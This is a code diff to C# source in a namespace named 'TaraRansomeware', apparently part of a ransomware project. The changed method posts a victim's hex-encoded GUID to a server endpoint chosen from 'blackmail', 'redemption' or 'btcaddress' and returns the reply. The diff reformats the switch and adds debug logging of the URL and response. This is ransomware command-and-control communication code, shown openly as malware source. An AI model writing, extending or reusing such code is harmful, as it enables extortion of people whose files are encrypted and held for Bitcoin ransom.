@@ -1,5 +1,6 @@
 ﻿using Org.BouncyCastle.Utilities.Encoders;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Net.Http;
 using System.Threading.Tasks;
 
@@ -43,23 +44,35 @@ namespace TaraRansomeware.Utilities
 
             switch (action)
             {
-                case PostAction.Blackmail: url += "blackmail"; break;
-                case PostAction.Redemption: url += "redemption"; break;
-                case PostAction.BTCAddress: url += "btcaddress"; break;
-                default: break;
+                case PostAction.Blackmail:
+                    url += "blackmail";
+                    break;
+                case PostAction.Redemption:
+                    url += "redemption";
+                    break;
+                case PostAction.BTCAddress:
+                    url += "btcaddress";
+                    break;
+                default:
+                    break;
             }
+
+            Debug.WriteLine(url);
 
             using (HttpClient client = new HttpClient())
             {
-                FormUrlEncodedContent content = new FormUrlEncodedContent(new[]
-                {
+                FormUrlEncodedContent content = new FormUrlEncodedContent(new[] {
                     new KeyValuePair<string, string>("guid", Hex.ToHexString(guid))
                 });
 
                 HttpResponseMessage response = await client.PostAsync(url, content);
                 response.EnsureSuccessStatusCode();
 
-                return await response.Content.ReadAsStringAsync();
+                string rsp = await response.Content.ReadAsStringAsync();
+
+                Debug.WriteLine(rsp);
+
+                return rsp;
             }
         }
     }
